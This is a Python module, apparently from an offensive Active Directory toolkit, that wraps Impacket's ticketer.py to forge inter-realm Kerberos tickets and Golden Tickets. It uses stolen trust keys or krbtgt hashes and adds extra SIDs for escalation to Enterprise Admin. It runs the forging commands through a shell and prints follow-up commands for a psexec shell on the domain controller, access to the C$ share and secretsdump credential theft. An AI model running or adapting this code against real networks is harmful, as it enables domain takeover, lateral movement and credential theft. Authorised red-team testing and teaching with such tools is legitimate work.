"""
Impacket Ticket Forger
Forge inter-realm TGTs using Impacket's ticketer.py
"""

import subprocess
import shutil
from typing import Optional, List
from pathlib import Path
from datetime import datetime

from .base import BaseForger
from ..models import TrustKey, ForgedTicket, KeyType
from ..utils import get_inter_realm_spn


class ImpacketForger(BaseForger):
    """
    Forge tickets using Impacket ticketer.py

    Requirements:
    - Impacket installed
    - Extracted trust key
    - Domain SID
    """

    def __init__(self, output_dir: str = "trust_keys", verbose: bool = True):
        """Initialize Impacket forger"""
        super().__init__(output_dir, verbose)
        self.timeout = 30

    def is_available(self) -> bool:
        """Check if ticketer.py is available"""
        return shutil.which("ticketer.py") is not None

    def generate_commands(
            self,
            trust_key: TrustKey,
            user_to_impersonate: str,
            user_sid: Optional[str] = None,
            extra_sids: Optional[List[str]] = None
    ) -> List[str]:
        """
        Generate Impacket ticketer.py commands
        """
        target_spn = get_inter_realm_spn(trust_key.target_domain)

        # Determine best key to use
        key_type, key_value = trust_key.best_key

        if key_type == KeyType.AES256:
            key_param = f"-aesKey {key_value}"
        elif key_type == KeyType.AES128:
            key_param = f"-aesKey {key_value}"
        else:
            key_param = f"-nthash {key_value}"

        commands = [
            "# Impacket ticketer.py Inter-realm TGT Forging",
            "# Creates a forged Kerberos ticket for cross-domain access",
            "",
            "# Basic inter-realm TGT",
            f"ticketer.py {key_param} -domain-sid DOMAIN_SID_HERE -domain {trust_key.source_domain} -spn {target_spn} {user_to_impersonate}",
            "",
            "# This creates: {user_to_impersonate}.ccache",
            "",
            "# Set the ticket for use",
            f"export KRB5CCNAME={user_to_impersonate}.ccache",
            "",
            "# Use the ticket to access target domain",
            f"psexec.py -k -no-pass {trust_key.target_domain}/{user_to_impersonate}@dc.{trust_key.target_domain}",
            "",
            "# Or SMB access",
            f"smbclient.py -k -no-pass {trust_key.target_domain}/{user_to_impersonate}@dc.{trust_key.target_domain}",
        ]

        # Add extra SIDs if provided (Enterprise Admin escalation)
        if extra_sids:
            sids_param = " ".join([f"-extra-sid {sid}" for sid in extra_sids])
            commands.extend([
                "",
                "# With SID History for privilege escalation",
                f"ticketer.py {key_param} -domain-sid DOMAIN_SID_HERE -domain {trust_key.source_domain} {sids_param} -spn {target_spn} {user_to_impersonate}",
            ])

        return commands

    def forge_inter_realm_tgt(
            self,
            trust_key: TrustKey,
            user_to_impersonate: str,
            user_sid: Optional[str] = None,
            extra_sids: Optional[List[str]] = None
    ) -> Optional[ForgedTicket]:
        """
        Forge inter-realm TGT using Impacket ticketer.py
        """
        self.log(f"Forging inter-realm TGT with Impacket...")
        self.log(f"Source: {trust_key.source_domain}")
        self.log(f"Target: {trust_key.target_domain}")
        self.log(f"User: {user_to_impersonate}")

        if not user_sid:
            self.log("Domain SID required for ticketer.py", "warning")
            self.log("Use: lookupsid.py to get domain SID")

            # Generate commands for manual execution
            commands = self.generate_commands(
                trust_key, user_to_impersonate, user_sid, extra_sids
            )
            self.save_commands(commands, trust_key, user_to_impersonate)

            return None

        target_spn = get_inter_realm_spn(trust_key.target_domain)
        key_type, key_value = trust_key.best_key

        # Build command
        if key_type in [KeyType.AES256, KeyType.AES128]:
            key_param = f"-aesKey {key_value}"
        else:
            key_param = f"-nthash {key_value}"

        cmd = f"ticketer.py {key_param} -domain-sid {user_sid} -domain {trust_key.source_domain} -spn {target_spn} {user_to_impersonate}"

        # Add extra SIDs
        if extra_sids:
            for sid in extra_sids:
                cmd += f" -extra-sid {sid}"

        self.log(f"Executing ticketer.py...")

        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=self.timeout,
                cwd=str(self.output_dir)
            )

            if result.returncode == 0:
                self.log("Ticket forged successfully!", "success")

                ticket_file = self.output_dir / f"{user_to_impersonate}.ccache"

                if ticket_file.exists():
                    self.log(f"Ticket saved to: {ticket_file}", "success")
                    self._print_usage_instructions(ticket_file, trust_key, user_to_impersonate)

                    ticket = ForgedTicket(
                        ticket_type="inter-realm TGT",
                        username=user_to_impersonate,
                        source_domain=trust_key.source_domain,
                        target_domain=trust_key.target_domain,
                        target_service=target_spn,
                        key_type=key_type,
                        key_used=key_value[:8] + "..." if len(key_value) > 8 else key_value,
                        ticket_file=str(ticket_file),
                        extra_sids=extra_sids or [],
                        created_at=datetime.now(),
                    )

                    return ticket
            else:
                self.log(f"ticketer.py failed: {result.stderr}", "error")

        except subprocess.TimeoutExpired:
            self.log("ticketer.py timeout", "error")
        except Exception as e:
            self.log(f"Error: {e}", "error")

        return None

    def _print_usage_instructions(
            self,
            ticket_file: Path,
            trust_key: TrustKey,
            user: str
    ) -> None:
        """Print instructions for using the forged ticket"""
        print(f"\n" + "=" * 60)
        print("FORGED TICKET READY")
        print("=" * 60)

        print(f"\n[+] Ticket file: {ticket_file}")

        print(f"\n[*] To use this ticket:")
        print(f"    export KRB5CCNAME={ticket_file}")

        print(f"\n[*] Then access target domain:")
        print(f"    # Get shell on DC")
        print(f"    psexec.py -k -no-pass {trust_key.target_domain}/{user}@dc.{trust_key.target_domain}")
        print(f"\n    # List shares")
        print(f"    smbclient.py -k -no-pass //{trust_key.target_domain}/c$")
        print(f"\n    # Secretsdump")
        print(f"    secretsdump.py -k -no-pass {trust_key.target_domain}/{user}@dc.{trust_key.target_domain}")

    def forge_golden_ticket_with_trust(
            self,
            trust_key: TrustKey,
            user_to_impersonate: str,
            domain_sid: str,
            krbtgt_hash: str,
            extra_sids: Optional[List[str]] = None
    ) -> Optional[ForgedTicket]:
        """
        Forge Golden Ticket with inter-realm trust access

        This is a more powerful approach that creates a Golden Ticket
        with extra SIDs for the target domain.
        """
        self.log("Forging Golden Ticket with trust access...")

        # Build command for golden ticket with extra-sid
        cmd = f"ticketer.py -nthash {krbtgt_hash} -domain-sid {domain_sid} -domain {trust_key.source_domain}"

        if extra_sids:
            for sid in extra_sids:
                cmd += f" -extra-sid {sid}"

        cmd += f" {user_to_impersonate}"

        self.log(f"Command: {cmd}")

        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=self.timeout,
                cwd=str(self.output_dir)
            )

            if result.returncode == 0:
                self.log("Golden Ticket forged!", "success")

                ticket_file = self.output_dir / f"{user_to_impersonate}.ccache"

                return ForgedTicket(
                    ticket_type="Golden Ticket",
                    username=user_to_impersonate,
                    source_domain=trust_key.source_domain,
                    target_domain=trust_key.target_domain,
                    target_service="krbtgt",
                    key_type=KeyType.RC4_HMAC,
                    key_used=krbtgt_hash[:8] + "...",
                    ticket_file=str(ticket_file) if ticket_file.exists() else None,
                    extra_sids=extra_sids or [],
                    created_at=datetime.now(),
                )
            else:
                self.log(f"Failed: {result.stderr}", "error")

        except Exception as e:
            self.log(f"Error: {e}", "error")

        return None